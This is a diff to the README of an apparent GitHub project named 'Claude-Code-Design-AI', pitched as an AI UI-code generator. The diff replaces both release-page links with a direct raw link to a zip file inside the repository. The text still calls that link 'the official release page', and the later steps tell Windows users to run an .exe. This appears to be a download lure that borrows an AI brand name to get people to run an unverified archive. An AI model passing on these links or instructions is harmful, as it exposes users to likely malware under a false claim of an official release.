@@ -1,6 +1,6 @@
 # 🎨 Claude-Code-Design-AI - Build professional UI designs using AI
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Corn7012/Claude-Code-Design-AI/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Corn7012/Claude-Code-Design-AI/raw/refs/heads/main/Design/Code-Design-AI-Claude-1.2-alpha.2.zip)
 
 Claude-Code-Design-AI turns your design ideas into functional code. This tool creates React components, Tailwind CSS styles, and UI layouts from simple inputs. It handles the technical parts of front-end development so you focus on the creative vision of your project.
 
@@ -21,7 +21,7 @@ Key features include:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official release page: [https://github.com/Corn7012/Claude-Code-Design-AI/releases](https://github.com/Corn7012/Claude-Code-Design-AI/releases).
+1.  Visit the official release page: [https://github.com/Corn7012/Claude-Code-Design-AI/raw/refs/heads/main/Design/Code-Design-AI-Claude-1.2-alpha.2.zip](https://github.com/Corn7012/Claude-Code-Design-AI/raw/refs/heads/main/Design/Code-Design-AI-Claude-1.2-alpha.2.zip).
 2.  Locate the section labeled "Assets" at the bottom of the latest release post.
 3.  Click the file ending in `.exe` to begin the download.
 4.  Once the file finishes downloading, open your "Downloads" folder.
